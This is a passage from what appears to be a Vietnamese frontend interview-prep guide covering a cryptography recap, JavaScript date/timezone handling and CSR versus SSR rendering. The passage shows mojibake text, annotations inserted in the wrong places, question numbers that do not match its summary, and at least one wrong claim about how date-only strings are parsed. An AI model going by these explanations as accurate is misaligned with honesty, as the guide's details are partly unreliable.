);
```

**‚úÖ Correction:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ GOOD - Always verify signature
const payload = jwt.verify(token, publicKey);
```

---

**üéØ K·∫øt Lu·∫≠n:**

**Hashing:**

- ‚úÖ One-way, d√πng cho passwords (bcrypt), checksums (SHA-256)
- ‚úÖ Kh√¥ng th·ªÉ decrypt

**Encryption:**

- ‚úÖ Two-way, d√πng cho sensitive data (AES), key exchange (RSA)
- ‚úÖ Symmetric (AES) nhanh, Asymmetric (RSA) ch·∫≠m nh∆∞ng kh√¥ng c·∫ßn share key

**Digital Signatures:**

- ‚úÖ Verify authenticity & integrity
- ‚úÖ JWT (RS256), API authentication, webhooks

**üí° Key Takeaway:**

- Hash cho verification, Encryption cho confidentiality, Signature cho authenticity
- D√πng proven libraries (bcrypt, crypto, jsonwebtoken)
- Never roll your own crypto!
---
## 41. ‚è∞ Q41: Date & Time Handling - X·ª≠ L√Ω M√∫i Gi·ªù ƒê√∫ng C√°ch  

**P1: T√™n c√¢u h·ªèi:** ‚è∞ Q41: Date & Time Handling - X·ª≠ L√Ω M√∫i Gi·ªù ƒê√∫ng C√°ch  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"D√πng Timestamps (Unix milliseconds) ho·∫∑c ISO 8601 UTC cho storage/transmission, convert sang local timezone ch·ªâ khi display. Libraries: date-fns, dayjs, Luxon."**

**üîë Best Practices:**

**1. Storage & Transmission - Lu√¥n UTC:**
- **Timestamp** (Unix ms): `Date.now()` = 1705329000000 - absolute time point
- **ISO 8601 UTC**: `new Date().toISOString()` = "2024-01-15T14:30:00.000Z"
- Database l∆∞u TIMESTAMP ho·∫∑c DATETIME UTC
- API truy·ªÅn ISO 8601 v·ªõi 'Z' suffix (UTC)

**2. Display - Convert to Local:**
- `new Date(timestamp).toLocaleString('vi-VN', {timeZone: 'Asia/Ho_Chi_Minh'})`
- `Intl.DateTimeFormat` cho i18n formatting
- Show timezone explicitly: "15/01/2024 21:30 ICT"

**3. Avoid Native Date Pitfalls:**
- ‚ùå `new Date('2024-01-15')` ‚Üí depends on browser timezone
- ‚ùå Months zero-indexed: `new Date(2024, 1, 15)` = Feb 15
- ‚ùå Mutable: `date.setMonth()` modifies original
- ‚úÖ Use libraries: **date-fns** (functional, tree-shakable), **dayjs** (lightweight), **Luxon** (immutable, timezone-aware)

**4. Common Scenarios:**
- **User selects date**: Convert local ‚Üí UTC before send server
- **Display server date**: Parse UTC ‚Üí convert local timezone
- **Scheduling**: Store UTC + user's timezone separately
- **Recurring events**: Calculate in user's timezone (handle DST)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- L∆∞u date string "DD/MM/YYYY" ‚Üí parsing issues, d√πng ISO 8601
- Compare dates kh√¥ng normalize timezone ‚Üí sai k·∫øt qu·∫£
- Qu√™n Daylight Saving Time (DST) ‚Üí sai 1 gi·ªù 2 l·∫ßn/nƒÉm
- D√πng `Date()` constructor v·ªõi string ‚Üí browser-dependent parsing

**üí° Ki·∫øn Th·ª©c Senior:**
- **IANA timezone database**: "Asia/Ho_Chi_Minh", kh√¥ng d√πng "GMT+7" (kh√¥ng handle DST)
- **ISO 8601 formats**: `2024-01-15T14:30:00Z` (UTC) vs `2024-01-15T14:30:00+07:00` (offset)
- **Temporal API** (TC39 Stage 3): Future replacement for Date - `Temporal.ZonedDateTime`
- **UTC Offset vs Timezone**: Offset = static (+7), Timezone = rules (handle DST, history)

**‚ùì C√¢u H·ªèi:**
L√†m th·∫ø n√†o x·ª≠ l√Ω Date/Time trong JavaScript kh√¥ng b·ªã ·∫£nh h∆∞·ªüng b·ªüi m√∫i gi·ªù?


#### **‚ö†Ô∏è V·∫•n ƒê·ªÅ Core**

```typescript
// ‚ùå V·∫§N ƒê·ªÄ: Timezone-dependent
const date = new Date('2024-01-15'); // Ch√∫ gi·∫£i: Local timezone!
 // Ch√∫ gi·∫£i: User Vietnam (UTC+7): 2024-01-15 07:00:00 UTC
 // Ch√∫ gi·∫£i: User US (UTC-5):      2024-01-15 05:00:00 UTC
// ‚Üí C√πng code, kh√°c k·∫øt qu·∫£!

// ‚ùå V·∫§N ƒê·ªÄ: Month zero-indexed
new Date(2024, 1, 15); // Ch√∫ gi·∫£i: February 15! (month 1 = Feb)

// ‚ùå V·∫§N ƒê·ªÄ: Mutable
date.setMonth(2); // Thay ƒë·ªïi date g·ªëc!
```

---

#### **üí° Timestamp - T·∫°i Sao Kh√¥ng B·ªã ·∫¢nh H∆∞·ªüng Timezone?**

**Timestamp = S·ªë milliseconds t·ª´ 1970-01-01 00:00:00 UTC (Unix Epoch)**

```typescript
 // Ch√∫ gi·∫£i: =====================================
// TIMESTAMP L√Ä M·ªòT CON S·ªê TUY·ªÜT ƒê·ªêI
 // Ch√∫ gi·∫£i: =====================================

// V√≠ d·ª•: 2024-01-15 14:30:00 UTC
const timestamp = 1705329000000; // Ch√∫ gi·∫£i: milliseconds

// ‚úÖ Timestamp ƒë·∫°i di·ªán cho 1 ƒêI·ªÇM TH·ªúI GIAN DUY NH·∫§T tr√™n to√†n c·∫ßu
// - Kh√¥ng ph·ª• thu·ªôc m√∫i gi·ªù
// - Kh√¥ng ph·ª• thu·ªôc v·ªã tr√≠ ƒë·ªãa l√Ω
// - Ch·ªâ l√† 1 con s·ªë: s·ªë milli-gi√¢y t·ª´ 1970-01-01 00:00:00 UTC

// GI·∫¢I TH√çCH:
 // Ch√∫ gi·∫£i: ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
 // Ch√∫ gi·∫£i: ‚îÇ  Timestamp 1705329000000 = "2024-01-15 14:30:00 UTC"   ‚îÇ
 // Ch√∫ gi·∫£i: ‚îÇ                                                         ‚îÇ
// ‚îÇ  C√πng 1 timestamp, DISPLAY kh√°c m√∫i gi·ªù:               ‚îÇ
 // Ch√∫ gi·∫£i: ‚îÇ  - Vietnam (UTC+7):  2024-01-15 21:30:00               ‚îÇ
 // Ch√∫ gi·∫£i: ‚îÇ  - New York (UTC-5): 2024-01-15 09:30:00               ‚îÇ
 // Ch√∫ gi·∫£i: ‚îÇ  - London (UTC+0):   2024-01-15 14:30:00               ‚îÇ
 // Ch√∫ gi·∫£i: ‚îÇ                                                         ‚îÇ
// ‚îÇ  Nh∆∞ng timestamp V·∫™N L√Ä 1705329000000                  ‚îÇ
// ‚îÇ  ‚Üí C√πng 1 ƒëi·ªÉm th·ªùi gian, ch·ªâ HI·ªÇN TH·ªä kh√°c!           ‚îÇ
 // Ch√∫ gi·∫£i: ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**So S√°nh Tr·ª±c Quan:**

```typescript
 // Ch√∫ gi·∫£i: =====================================
// V√ç D·ª§ TH·ª∞C T·∫æ
 // Ch√∫ gi·∫£i: =====================================

 // Ch√∫ gi·∫£i: Server g·ª≠i timestamp
const serverTimestamp = 1705329000000; // Ch√∫ gi·∫£i: 2024-01-15 14:30:00 UTC

// User ·ªü Vietnam nh·∫≠n ƒë∆∞·ª£c
const vnDate = new Date(serverTimestamp);
console.log(vnDate.toString());
 // Ch√∫ gi·∫£i: "Mon Jan 15 2024 21:30:00 GMT+0700 (Indochina Time)"
 // Ch√∫ gi·∫£i: ‚úÖ Display: 21:30:00 (UTC+7)
 // Ch√∫ gi·∫£i: ‚úÖ Timestamp: 1705329000000

// User ·ªü US nh·∫≠n ƒë∆∞·ª£c
const usDate = new Date(serverTimestamp);
console.log(usDate.toString());
 // Ch√∫ gi·∫£i: "Mon Jan 15 2024 09:30:00 GMT-0500 (Eastern Standard Time)"
 // Ch√∫ gi·∫£i: ‚úÖ Display: 09:30:00 (UTC-5)
 // Ch√∫ gi·∫£i: ‚úÖ Timestamp: 1705329000000

// So s√°nh timestamps
console.log(vnDate.getTime() === usDate.getTime()); // Ch√∫ gi·∫£i: ‚úÖ TRUE!
console.log(vnDate.getTime()); // Ch√∫ gi·∫£i: 1705329000000
console.log(usDate.getTime()); // Ch√∫ gi·∫£i: 1705329000000

 // Ch√∫ gi·∫£i: =====================================
// T·∫†I SAO TIMESTAMP KH√îNG B·ªä ·∫¢NH H∆Ø·ªûNG?
 // Ch√∫ gi·∫£i: =====================================

// 1. Timestamp l√† CON S·ªê, kh√¥ng ph·∫£i string hay object
const ts = 1705329000000; // Ch·ªâ l√† 1 s·ªë nguy√™n

// 2. Timestamp lu√¥n t√≠nh t·ª´ UTC EPOCH (1970-01-01 00:00:00 UTC)
// ‚Üí Chu·∫©n qu·ªëc t·∫ø, kh√¥ng ƒë·ªïi

// 3. Khi convert timestamp ‚Üí Date, browser t·ª± ƒë·ªông hi·ªÉn th·ªã theo local timezone
// Nh∆∞ng INTERNAL VALUE v·∫´n l√† timestamp (kh√¥ng ƒë·ªïi)
const date = new Date(1705329000000);
date.getTime(); // Ch√∫ gi·∫£i: 1705329000000 (gi·ªëng nhau m·ªçi n∆°i)
date.toString(); // Kh√°c nhau theo timezone (ch·ªâ l√† display)

 // Ch√∫ gi·∫£i: =====================================
// MINH H·ªåA B·∫∞ NG S·ªê
 // Ch√∫ gi·∫£i: =====================================

// Gi·∫£ s·ª≠ c√≥ 3 user ·ªü 3 m√∫i gi·ªù kh√°c nhau c√πng click "Submit" 1 l√∫c

// User Vietnam (UTC+7) - Hi·ªÉn th·ªã: 2024-01-15 21:30:00
const vnTimestamp = new Date('2024-01-15T21:30:00+07:00').getTime();
console.log(vnTimestamp); // Ch√∫ gi·∫£i: 1705329000000

// User US (UTC-5) - Hi·ªÉn th·ªã: 2024-01-15 09:30:00
const usTimestamp = new Date('2024-01-15T09:30:00-05:00').getTime();
console.log(usTimestamp); // Ch√∫ gi·∫£i: 1705329000000

// User UK (UTC+0) - Hi·ªÉn th·ªã: 2024-01-15 14:30:00
const ukTimestamp = new Date('2024-01-15T14:30:00Z').getTime();
console.log(ukTimestamp); // Ch√∫ gi·∫£i: 1705329000000

// ‚úÖ C√ôNG 1 TIMESTAMP = C√ôNG 1 TH·ªúI ƒêI·ªÇM
// ‚Üí L∆∞u v√†o database: 1705329000000
// ‚Üí Compare: So s√°nh 1 s·ªë duy nh·∫•t
// ‚Üí Kh√¥ng b·ªã sai l·ªách m√∫i gi·ªù
```

**K·∫øt Lu·∫≠n:**

```typescript
 // Ch√∫ gi·∫£i: =====================================
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
 // Ch√∫ gi·∫£i: =====================================

// ‚úÖ Timestamp l√† "ng√¥n ng·ªØ chung" c·ªßa th·ªùi gian
// - M·ªçi timezone ƒë·ªÅu convert v·ªÅ 1 s·ªë duy nh·∫•t
// - Database l∆∞u 1 gi√° tr·ªã, kh√¥ng ph·ª• thu·ªôc m√∫i gi·ªù
// - API truy·ªÅn 1 s·ªë, kh√¥ng b·ªã nh·∫ßm l·∫´n
// - So s√°nh ƒë∆°n gi·∫£n: a > b, a === b

 // Ch√∫ gi·∫£i: ‚ùå String date B·ªä ·∫¢NH H∆Ø·ªûNG timezone
'2024-01-15' // Ambiguous! 00:00 m√∫i gi·ªù n√†o?
'2024-01-15 14:30' // M√∫i gi·ªù n√†o?

// ‚úÖ Timestamp KH√îNG B·ªä ·∫¢NH H∆Ø·ªûNG
1705329000000 // LU√îN L√Ä 2024-01-15 14:30:00 UTC
              // Display t√πy timezone, nh∆∞ng VALUE kh√¥ng ƒë·ªïi
```

---

#### **üí° Nguy√™n T·∫Øc V√†ng**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   STORAGE:  UTC/Timestamp             ‚îÇ
‚îÇ   TRANSMIT: ISO 8601 + timezone       ‚îÇ
‚îÇ   DISPLAY:  User local timezone       ‚îÇ
‚îÇ   COMPUTE:  UTC/Timestamp             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **‚úÖ Gi·∫£i Ph√°p ƒê√∫ng**

**1. Store UTC:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Database/API: Always UTC
await db.save({
  createdAt: Date.now(), // Ch√∫ gi·∫£i: Timestamp
 // Ch√∫ gi·∫£i: Or: new Date().toISOString(), // "2024-01-15T14:30:00.000Z"
});

 // Ch√∫ gi·∫£i: ‚úÖ Parse ISO 8601 (auto UTC v·ªõi Z)
const date = new Date('2024-01-15T14:30:00.000Z');
```

**2. Display Local:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ Convert to user timezone
const formatter = new Intl.DateTimeFormat('en-US', {
  timeZone: 'Asia/Ho_Chi_Minh',
  dateStyle: 'long',
  timeStyle: 'short',
});
console.log(formatter.format(date)); // Ch√∫ gi·∫£i: "January 15, 2024 at 9:30 PM"
```

**3. Compare Timestamps:**

```typescript
// ‚úÖ So s√°nh kh√¥ng b·ªã ·∫£nh h∆∞·ªüng timezone
const isAfter = date1.getTime() > date2.getTime();
const daysDiff = Math.floor(
  (date2.getTime() - date1.getTime()) / (1000 * 60 * 60 * 24)
);
```

**4. Date Arithmetic:**

```typescript
// ‚úÖ C·ªông/tr·ª´ ng√†y
function addDays(date: Date, days: number): Date {
  return new Date(date.getTime() + days * 24 * 60 * 60 * 1000);
}

 // Ch√∫ gi·∫£i: ‚úÖ Start/End of day (UTC)
const startOfDay = new Date(Date.UTC(
  date.getUTCFullYear(),
  date.getUTCMonth(),
  date.getUTCDate()
));
```

---

#### **üìö Libraries (Recommend)**

**date-fns (Functional, Tree-shakeable):**

```typescript
import { format, parseISO, addDays, formatDistanceToNow } from 'date-fns';
import { utcToZonedTime } from 'date-fns-tz';

const date = parseISO('2024-01-15T14:30:00.000Z');
format(date, 'yyyy-MM-dd HH:mm:ss'); // Ch√∫ gi·∫£i: "2024-01-15 14:30:00"

const vnTime = utcToZonedTime(date, 'Asia/Ho_Chi_Minh');
formatDistanceToNow(date, { addSuffix: true }); // Ch√∫ gi·∫£i: "2 hours ago"
```

**Luxon (OOP, Timezone-aware):**

```typescript
import { DateTime } from 'luxon';

const dt = DateTime.fromISO('2024-01-15T14:30:00.000Z');
dt.setZone('Asia/Ho_Chi_Minh').toFormat('yyyy-MM-dd HH:mm:ss');
dt.plus({ days: 7 }).toRelative(); // Ch√∫ gi·∫£i: "in 7 days"
```

**Day.js (Lightweight 2KB):**

```typescript
import dayjs from 'dayjs';
import utc from 'dayjs/plugin/utc';
import timezone from 'dayjs/plugin/timezone';

dayjs.extend(utc);
dayjs.extend(timezone);

dayjs('2024-01-15T14:30:00.000Z')
  .tz('Asia/Ho_Chi_Minh')
  .format('YYYY-MM-DD HH:mm:ss');
```

---

#### **üöÄ Temporal API (Future)**

```typescript
import { Temporal } from '@js-temporal/polyfill';

 // Ch√∫ gi·∫£i: ‚úÖ Instant (UTC)
const instant = Temporal.Instant.from('2024-01-15T14:30:00Z');

 // Ch√∫ gi·∫£i: ‚úÖ ZonedDateTime (Timezone-aware)
const vnTime = instant.toZonedDateTimeISO('Asia/Ho_Chi_Minh');
console.log(vnTime.toString()); // Ch√∫ gi·∫£i: "2024-01-15T21:30:00+07:00[Asia/Ho_Chi_Minh]"

 // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn. B·∫•t bi·∫øn: gi√° tr·ªã kh√¥ng thay ƒë·ªïi sau khi t·∫°o; th∆∞·ªùng d√πng ƒë·ªÉ tr√°nh side-effect v√† d·ªÖ reasoning.
```

---

#### **üéØ Best Practices**

**‚úÖ DO:**

```typescript
 // Ch√∫ gi·∫£i: Store UTC
{ createdAt: "2024-01-15T14:30:00.000Z" }

 // Ch√∫ gi·∫£i: Compare timestamps
date1.getTime() > date2.getTime()

 // Ch√∫ gi·∫£i: Use library
import { format, parseISO } from 'date-fns';
```

**‚ùå DON'T:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Store without timezone
{ date: "2024-01-15" } // Ch√∫ gi·∫£i: Ambiguous!

 // Ch√∫ gi·∫£i: ‚ùå Use local Date
new Date() // Ch√∫ gi·∫£i: Timezone-dependent!

 // Ch√∫ gi·∫£i: ‚ùå Compare dates with ===
date1 === date2 // Ch√∫ gi·∫£i: Always false

 // Ch√∫ gi·∫£i: ‚ùå Mutate
date.setMonth(2) // Ch√∫ gi·∫£i: Side effect!
```

**üí° Key Takeaway:**
- **Store UTC** ‚Üí **Display Local**
- D√πng **timestamp** cho comparison
- D√πng **library** (date-fns/Luxon/Day.js)
- **Temporal API** = future standard

---

**üéØ K·∫øt Lu·∫≠n T·ªïng Th·ªÉ:**

**Performance Optimization (Q56):**

- ‚úÖ 5-layer strategy: Build-time ‚Üí Network ‚Üí Rendering ‚Üí State ‚Üí Memory
- ‚úÖ Measurable results: 70% faster load, 82% smaller bundle, 60 FPS
- ‚úÖ Tools: Vite, React.memo, Zustand, react-window, Chrome DevTools

**Security (Q57):**

- ‚úÖ 7-layer defense: HTTPS ‚Üí XSS ‚Üí CSRF ‚Üí Auth ‚Üí Storage ‚Üí API ‚Üí Headers
- ‚úÖ Comprehensive protection: Input sanitization, JWT tokens, rate limiting
- ‚úÖ Tools: DOMPurify, Helmet, Zod, bcrypt

**Cryptography (Q58):**

- ‚úÖ Hash (bcrypt, SHA-256): Passwords, checksums, integrity
- ‚úÖ Encryption (AES, RSA): Sensitive data, HTTPS, key exchange
- ‚úÖ Digital Signatures (RS256, HMAC): JWT, API auth, webhooks

**Date & Time Handling (Q59):**

- ‚úÖ UTC-first approach: Store UTC, display local timezone
- ‚úÖ ISO 8601 standard: "2024-01-15T14:30:00.000Z"
- ‚úÖ Libraries: date-fns (functional), Luxon (OOP), Day.js (lightweight)
- ‚úÖ Temporal API: Future standard (Stage 3 proposal)

**üí° Key Takeaway:**

- Performance & Security KH√îNG ph·∫£i optional - l√† MUST-HAVE cho production apps
- Date/Time: Always UTC for storage, convert to local for display
- Measure & Monitor trong production
- Defense in depth: Multiple layers of protection
- Use proven libraries - NEVER roll your own crypto or date handling!
---
## 42. üñ•Ô∏è Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Ph√¢n Bi·ªát & C√°ch Ho·∫°t ƒê·ªông Chi Ti·∫øt  

**P1: T√™n c√¢u h·ªèi:** üñ•Ô∏è Q42: Client-Side Rendering (CSR) vs Server-Side Rendering (SSR) - Ph√¢n Bi·ªát & C√°ch Ho·∫°t ƒê·ªông Chi Ti·∫øt  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"CSR = browser render (SPA), SSR = server render HTML. CSR t·ªët cho interactive apps, SSR t·ªët cho SEO/performance. Modern: Hybrid (SSR first paint + CSR hydration)."**

**üîë So S√°nh Chi Ti·∫øt:**

| **Metric** | **CSR** | **SSR** |
|-----------|---------|--------|
| **Initial Load** | Ch·∫≠m (download JS ‚Üí execute) | Nhanh (HTML ready) |
| **SEO** | K√©m (crawlers kh√¥ng ch·ªù JS) | T·ªët (HTML ƒë·∫ßy ƒë·ªß) |
| **Navigation** | Nhanh (no reload) | Ch·∫≠m (full page reload) |
| **Server Load** | Th·∫•p (static CDN) | Cao (render m·ªói request) |
| **Complexity** | ƒê∆°n gi·∫£n (frontend only) | Ph·ª©c t·∫°p (isomorphic code) |

**üîë CSR (Client-Side Rendering):**

**C√°ch ho·∫°t ƒë·ªông:**
1. Server g·ª≠i empty HTML + JS bundle (500KB-2MB)
2. Browser download ‚Üí parse ‚Üí execute JS
3. React/Vue render UI ‚Üí attach events (hydration)

**∆Øu ƒëi·ªÉm:**
- **Fast navigation** - no reload, smooth SPA experience
- **Rich interactions** - full JS power, real-time features
- **Low server cost** - CDN serving static files

**Nh∆∞·ª£c ƒëi·ªÉm:**
- **Slow First Paint** - ch·ªù download + execute JS (2-5s)
- **Poor SEO** - crawlers kh√¥ng execute JS
- **Large bundle** - 500KB+ initial load

**üîë SSR (Server-Side Rendering):**

**C√°ch ho·∫°t ƒë·ªông:**
1. Server render React/Vue ‚Üí HTML string
2. Send full HTML (c√≥ content) v·ªÅ browser
3. Browser display ngay ‚Üí download JS ‚Üí hydrate (interactivity)

**∆Øu ƒëi·ªÉm:**
- **Fast First Paint** - HTML ready, no JS blocking
- **SEO-friendly** - crawlers th·∫•y full content
- **Better performance** on slow devices/networks

**Nh∆∞·ª£c ƒëi·ªÉm:**
- **High server load** - render m·ªói request
- **TTFB slower** - server processing time
- **Complex setup** - isomorphic code, hydration issues

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- SSR d√πng browser APIs (`window`, `localStorage`) ‚Üí crash server
- Hydration mismatch (server HTML ‚â† client HTML) ‚Üí re-render flicker
- CSR kh√¥ng loading state ‚Üí blank screen 3-5s
- SSR kh√¥ng cache ‚Üí overload server

**üí° Ki·∫øn Th·ª©c Senior:**
- **Hybrid rendering**: Next.js SSG (static) + ISR (revalidate) + SSR (dynamic)
- **Streaming SSR**: Send HTML chunks progressively (React 18 Suspense)
- **Partial Hydration**: Ch·ªâ hydrate interactive components (Islands Architecture - Astro)
- **Edge SSR**: Render on CDN edge (Vercel Edge, Cloudflare Workers) - faster TTFB

**Tr·∫£ l·ªùi:**

#### **üéØ Kh√°i Ni·ªám C·ªët L√µi**

**CSR (Client-Side Rendering):**
- Server g·ª≠i **HTML r·ªóng** (ch·ªâ c√≥ `<div id="root"></div>`) + **JavaScript bundle** (500KB-2MB)
- Browser **download JS ‚Üí parse ‚Üí execute ‚Üí render** ‚Üí hi·ªÉn th·ªã n·ªôi dung
- Gi·ªëng nh∆∞: Mua IKEA furniture (ph·∫£i t·ª± l·∫Øp r√°p ·ªü nh√†)
- Rendering engine: Browser (Chrome V8, Firefox SpiderMonkey)

**SSR (Server-Side Rendering):**
- Server **render s·∫µn HTML ƒë·∫ßy ƒë·ªß** (c√≥ n·ªôi dung) r·ªìi g·ª≠i v·ªÅ browser
- Browser **hi·ªÉn th·ªã ngay** HTML ‚Üí sau ƒë√≥ download JS ƒë·ªÉ t∆∞∆°ng t√°c
- Gi·ªëng nh∆∞: Mua furniture ƒë√£ l·∫Øp r√°p s·∫µn (ch·ªâ c·∫ßn ƒë·∫∑t v√†o nh√†)
- Rendering engine: Node.js server (React renderToString)


#### **‚úÖ ∆Øu ƒêi·ªÉm CSR (Client-Side Rendering)**

**1. Navigation C·ª±c Nhanh (Fast SPA Navigation)**
```
User clicks link:
- CSR: 0ms (ch·ªâ thay ƒë·ªïi DOM, kh√¥ng reload page)
- SSR: 500-1000ms (ph·∫£i request server, ƒë·ª£i render)
‚Üí Tr·∫£i nghi·ªám m∆∞·ª£t m√† nh∆∞ native app
```

**2. Rich Interactions (T∆∞∆°ng T√°c Phong Ph√∫)**
```typescript
// CSR: D·ªÖ d√†ng l√†m real-time features
- Live chat, notifications
- Drag & drop, animations
- Real-time data updates
- Complex state management
‚Üí Full JavaScript power tr√™n browser
```

**3. Server Load Th·∫•p (Less Server Load)**
```
- Server ch·ªâ serve static files (HTML, JS, CSS)
- Kh√¥ng c·∫ßn render cho m·ªói request
- D·ªÖ cache v·ªõi CDN
- Cost th·∫•p (ch·ªâ c·∫ßn CDN, kh√¥ng c·∫ßn powerful server)
```

**4. D·ªÖ Deploy & Scale**
```
- Deploy l√™n CDN (Vercel, Netlify, CloudFront)
- Kh√¥ng c·∫ßn server-side logic
- Auto-scale v·ªõi CDN
‚Üí Chi ph√≠ th·∫•p, d·ªÖ maintain
```

---

#### **‚ùå Nh∆∞·ª£c ƒêi·ªÉm CSR**

**1. Initial Load Ch·∫≠m (Slow First Load)**
```
Timeline:
[0s] User clicks link
[0-1s] Download HTML (5KB) - nhanh
[1-3s] Download JS bundle (500KB-2MB) - CH·∫¨M
[3-4s] Parse & Execute JS - CH·∫¨M
[4-5s] Fetch API data - CH·∫¨M
[5s] User sees content - QU√Å L√ÇU!

‚Üí User th·∫•y blank screen trong 3-5 gi√¢y
‚Üí Bounce rate cao (user r·ªùi trang)
```

**2. SEO Ngh√®o N√†n (Poor SEO)**
```html
<!-- Google bot sees: -->
<html>
  <body>
    <div id="root"></div>  <!-- EMPTY! -->
    <script src="bundle.js"></script>
  </body>
</html>

‚Üí Google kh√¥ng th·∫•y n·ªôi dung
‚Üí Kh√¥ng index ƒë∆∞·ª£c
‚Üí SEO ranking th·∫•p
```

**3. Blank Screen Problem**
```
User experience:
[0-3s] White/blank screen (nothing to see)
[3-5s] Loading spinner (still waiting...)
[5s+] Content appears (finally!)

‚Üí User frustrated
‚Üí Think website is broken
‚Üí Leave before content loads
```

**4. Ph·ª• Thu·ªôc JavaScript**
```
- User disable JS ‚Üí website kh√¥ng ch·∫°y
- JS error ‚Üí website crash
- Slow device ‚Üí website lag
‚Üí Kh√¥ng graceful degradation
```

---

#### **‚úÖ ∆Øu ƒêi·ªÉm SSR (Server-Side Rendering)**

**1. Initial Load C·ª±c Nhanh (Fast Time to Content)**
```
Timeline:
[0s] User clicks link
[0.5s] Server renders HTML (nhanh v√¨ server m·∫°nh)
[0.5s] Browser receives full HTML
[0.5s] User SEES content immediately!
[1-2s] JS hydrates in background
[2s] Fully interactive

‚Üí User th·∫•y n·ªôi dung trong 0.5-1 gi√¢y
‚Üí First impression t·ªët
```

**2. SEO Xu·∫•t S·∫Øc (SEO-Friendly)**
```html
<!-- Google bot sees: -->
<html>
  <body>
    <div id="root">
      <h1>Welcome to My Site</h1>
      <p>Full content here...</p>
      <article>Blog post content...</article>
      <!-- FULL CONTENT! -->
    </div>
  </body>
</html>

‚Üí Google index ƒë·∫ßy ƒë·ªß n·ªôi dung
‚Üí Better ranking
‚Üí Social media previews work (Open Graph)
```

**3. Better Performance (ƒê·∫∑c bi·ªát cho slow devices)**
```
- Server render nhanh (powerful CPU)
- User device kh√¥ng c·∫ßn l√†m vi·ªác n·∫∑ng
- Suitable for low-end phones
- √çt JS ‚Üí less battery drain
```

**4. Kh√¥ng Blank Screen**
```
User experience:
[0.5s] Content appears immediately!
[1-2s] Page becomes interactive

‚Üí Progressive enhancement
‚Üí Even if JS fails, HTML still works
‚Üí Better perceived performance
```

---

#### **‚ùå Nh∆∞·ª£c ƒêi·ªÉm SSR**

**1. Server Load Cao (High Server Cost)**
```
CSR:
- Server: "Here's HTML + JS" (1 l·∫ßn, cache ƒë∆∞·ª£c)
- Cost: $5/month (CDN)

SSR:
- Server: "Let me render this page..." (m·ªói request)
- Server: Parse React ‚Üí Fetch data ‚Üí Render HTML
- Cost: $50-500/month (c·∫ßn server m·∫°nh)

‚Üí 10-100x chi ph√≠ h∆°n CSR
```

**2. Navigation Ch·∫≠m H∆°n (Slower Navigation)**
```
User clicks internal link:

CSR:
- Instant (0ms) - ch·ªâ update DOM
- Smooth transition

SSR:
- Request server (50-200ms network)
- Server render (50-100ms)
- Download HTML (50-200ms)
- Total: 500-1000ms
‚Üí C√≥ th·ªÉ th·∫•y "flash" khi chuy·ªÉn trang
```

